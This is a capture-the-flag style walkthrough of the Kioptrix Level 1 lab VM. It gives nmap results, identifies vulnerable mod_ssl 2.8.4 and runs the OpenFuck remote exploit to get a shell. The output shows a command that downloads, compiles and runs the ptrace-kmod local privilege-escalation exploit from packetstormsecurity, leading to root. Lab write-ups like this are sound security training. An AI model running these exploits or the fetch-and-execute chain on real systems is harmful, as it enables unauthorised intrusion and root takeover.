### Kioptrix Level 1 \(Beginner Level VM\)

```
kaipowered@debian:~/Documents/Vulnhub/Kioptrix$ nmap -sC -sV -oA nmapscan 192.168.8.4

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-16 14:13 +08
Nmap scan report for 192.168.8.4
Host is up (0.68s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2017-08-16T06:15:47+00:00; +1m51s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: mean: 1m50s, deviation: 0s, median: 1m50s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.74 seconds
```



====================================================

No interesting files/directories found in dirbuster

====================================================



The vulnerable service is

443/tcp  open  ssl/https   Apache/1.3.20 \(Unix\)  \(Red-Hat/Linux\) mod\_ssl/2.8.4 OpenSSL/0.9.6b



- searchploit this "mod\_ssl/2.8.4"



- found available exploit for the vulnerable mod\_ssl/2.8.4



- openfuck exploit: https://www.exploit-db.com/exploits/764/



- updating the exploit: http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/



- if there are errors in compilation install the following libssl versions.

- link on how i solved the compilation error: http://www.chokepoint.net/2017/04/fixing-and-troubleshooting-openfuck.html



- after compiling and generated the exec file



    kaipowered@debian:~/Documents/Vulnhub/Kioptrix$ ./openfuck 0x6b 192.168.8.4 443 -c 40

    *******************************************************************
    * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
    *******************************************************************
    * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
    * #hackarena  irc.brasnet.org                                     *
    * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
    * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
    * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
    *******************************************************************

    Connection... 40 of 40
    Establishing SSL connection
    cipher: 0x4043808c   ciphers: 0x80f81e8
    Ready to send shellcode
    Spawning shell...
    bash: no job control in this shell
    bash-2.05$ 
    exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
    --03:14:47--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
               => `ptrace-kmod.c'
    Connecting to dl.packetstormsecurity.net:80... connected!
    HTTP request sent, awaiting response... 301 Moved Permanently
    Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
    --03:14:48--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
               => `ptrace-kmod.c'
    Connecting to dl.packetstormsecurity.net:443... connected!
    HTTP request sent, awaiting response... 200 OK
    Length: 3,921 [text/x-csrc]

        0K ...                                                   100% @ 478.64 KB/s

    03:14:50 (478.64 KB/s) - `ptrace-kmod.c' saved [3921/3921]

    [+] Attached to 6502
    [+] Waiting for signal
    [+] Signal caught
    [+] Shellcode placed at 0x4001189d
    [+] Now wait for suid shell...



we got root!



Note: 

	I tried dirbustering the web server but i haven't found any interesting files/directories.

	I also searched some available exploits in rpcbind but in turns out that the nfs protocol must be present or active in order to exploit the rpc service.

	I also tried the exploit/multi/samba/usermap\_script but it didn't work.

	This vm is for beginners.



